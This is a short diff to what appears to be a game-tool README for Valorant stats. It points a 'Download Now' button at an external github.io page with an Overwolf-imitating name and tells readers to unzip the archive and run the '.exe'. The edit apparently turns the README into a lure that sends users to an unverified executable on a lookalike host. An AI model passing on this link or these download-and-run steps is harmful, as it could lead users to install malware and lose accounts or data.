@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://overwolf-client-valorant.github.io/.github/)
 
 ## 📸 Overview
 ![overwolf-valorant-stats](https://github.com/user-attachments/assets/0d8f1df6-e7cd-4fad-b66a-f13239757533)
